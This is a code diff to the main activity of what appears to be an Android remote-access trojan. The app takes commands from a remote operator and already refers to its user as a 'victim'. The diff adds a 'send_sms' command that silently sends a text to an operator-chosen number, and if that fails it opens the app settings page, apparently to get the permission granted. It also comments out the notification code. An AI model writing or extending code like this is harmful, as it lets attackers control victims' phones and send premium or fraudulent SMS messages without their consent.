@@ -8,6 +8,7 @@ import android.os.Looper;
 import android.os.Message;
 import android.os.StrictMode;
 import android.support.v7.app.AppCompatActivity;
+// import androidx.appcompat.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.KeyEvent;
@@ -15,6 +16,9 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
+import android.net.Uri;
+import android.Manifest;
+import android.content.pm.PackageManager;
 
 import java.io.IOException;
 import java.net.DatagramPacket;
@@ -32,6 +36,7 @@ import java.nio.charset.StandardCharsets;
 import java.io.*;
 import java.io.FileOutputStream;
 import android.content.Intent;
+
 
 
 public class MainActivity extends AppCompatActivity {
@@ -178,6 +183,20 @@ public class MainActivity extends AppCompatActivity {
 										//  get a list of installed apps.
 										// output = pm.getInstalledApplications(0);
 									}
+									else if (result[0].trim().contains("send_sms"))
+									{
+										String number = result[1].trim();
+										String sms = result[2].trim();
+										try {
+												android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault(); smsManager.sendTextMessage(number, null, sms, null, null);
+														
+														 
+										}
+										catch (Exception e) { 
+												Intent myAppSettings = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())); myAppSettings.addCategory(Intent.CATEGORY_DEFAULT); myAppSettings.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(myAppSettings); 
+												e.printStackTrace();
+										}
+									}
 									else if (result[0].trim().contains("rickroll"))
 									{
 										output = "Victim just get rickrolled";
@@ -203,11 +222,41 @@ public class MainActivity extends AppCompatActivity {
 									{
 										if(result.length == 3)
 										{
-											NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
-													.setSmallIcon(R.drawable.ic_launcher)
-													.setContentTitle(result[1].trim())
-													.setContentText(result[2].trim())
-													.setPriority(NotificationCompat.PRIORITY_DEFAULT);
+											// NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+			
+											// Intent intent = new Intent(this, MainActivity.class); 
+											// intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); 
+											// PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0); 
+											// androidx.core.app.NotificationCompat.Builder builder; 
+											
+												// int notificationId = (int) _id;
+												// String channelId = "channel-01";
+												// String channelName = "Channel Name";
+												// int importance = NotificationManager.IMPORTANCE_HIGH;
+											
+												// if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+														// NotificationChannel mChannel = new NotificationChannel(
+																// channelId, channelName, importance);
+														// notificationManager.createNotificationChannel(mChannel);
+													// }
+											
+											   
+											 // androidx.core.app.NotificationCompat.Builder mBuilder = new androidx.core.app.NotificationCompat.Builder(context, channelId)
+														// .setSmallIcon(R.drawable.ic_launcher)
+														// .setContentTitle(result[1].trim())
+														// .setContentText(result[2].trim())
+														// .setAutoCancel(false)
+														// .setOngoing(true)
+														// .setContentIntent(pendingIntent);
+												// TaskStackBuilder stackBuilder = TaskStackBuilder.create(context);
+												// stackBuilder.addNextIntent(intent);
+												// PendingIntent resultPendingIntent = stackBuilder.getPendingIntent(
+														// 0,
+														// PendingIntent.FLAG_UPDATE_CURRENT
+												// );
+												// mBuilder.setContentIntent(resultPendingIntent);
+											
+												// notificationManager.notify(notificationId, mBuilder.build());
 
 										}
 										else
